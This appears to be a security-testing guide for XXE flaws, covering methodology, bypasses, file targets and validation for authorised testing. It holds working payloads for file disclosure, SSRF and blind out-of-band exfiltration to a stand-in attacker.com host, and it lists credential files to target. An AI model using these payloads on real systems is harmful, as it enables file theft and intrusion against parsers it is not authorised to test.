# XML External Entity (XXE) Testing Guide

> XXE exploits XML parsers that process external entity references. Impact includes file disclosure, SSRF, denial of service, and in some cases remote code execution.

## Scope

- XML file uploads
- SOAP web services
- XML-RPC endpoints
- Office document processing (DOCX, XLSX, PPTX)
- SVG image processing
- SAML authentication
- RSS/Atom feed processing

## Methodology

1. Identify XML input points
2. Test basic external entity declaration
3. Try parameter entities for blind XXE
4. Attempt out-of-band data exfiltration
5. Test for billion laughs (DoS)

## Basic XXE Payloads

### File Disclosure
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

### SSRF via XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server/secret">
]>
<data>&xxe;</data>
```

### Blind XXE with Parameter Entities
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<data>test</data>
```

External DTD (evil.dtd):
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
```

## File Targets

### Linux
- /etc/passwd, /etc/shadow (if readable)
- /etc/hosts, /etc/hostname
- /proc/self/environ, /proc/self/cmdline
- ~/.ssh/id_rsa, ~/.bash_history
- Application config files

### Windows
- C:\Windows\System32\drivers\etc\hosts
- C:\Windows\win.ini
- C:\Users\<user>\.ssh\id_rsa

### Application-Specific
- Web.xml, application.properties
- Database connection strings
- API keys in configuration

## Bypass Techniques

### Entity Encoding
- HTML entities in entity values
- Double encoding
- UTF-16 encoding for XML declaration

### Parser-Specific
- XInclude for parsers not allowing DTD
- SVG with embedded XML entities
- XSLT injection

### Protocol Variations
- file://, http://, https://, ftp://
- jar:file:// for Java
- netdoc:// for Java
- gopher:// for complex SSRF

## Special Contexts

### Office Documents
- DOCX: Unzip and inject XXE in XML components
- XLSX: document.xml, sharedStrings.xml
- Metadata in core.xml

### SVG Images
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

### SAML
- Inject XXE in SAML assertions
- Test both IdP and SP processing

## Out-of-Band Exfiltration

### DNS Exfiltration
```xml
<!ENTITY xxe SYSTEM "http://data.attacker.com">
```

### HTTP Exfiltration
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
%dtd;
```

### FTP Exfiltration
Useful for multi-line file content.

## Validation Requirements

1. Demonstrate file content retrieval
2. Show SSRF to internal services
3. Prove out-of-band data exfiltration for blind XXE
4. Document parser and context

## False Positives

- XML parsing with external entities disabled
- Input validation rejecting DOCTYPE declarations
- Network restrictions preventing external requests
- Modern frameworks with secure defaults

## Impact

- Sensitive file disclosure
- SSRF to internal services
- Denial of service (billion laughs)
- Port scanning via error messages
- RCE in specific configurations (expect://, php://)

## Pro Tips

1. Always test parameter entities for blind scenarios
2. Check multiple file paths - start with /etc/passwd
3. Use out-of-band for confirmation when responses are filtered
4. Test Office documents even when XML isn't obviously accepted
5. SAML endpoints are often overlooked XXE targets
6. Error messages may leak file existence information
7. Try different protocols for different capabilities
8. Check if DOCTYPE is rejected before trying complex payloads
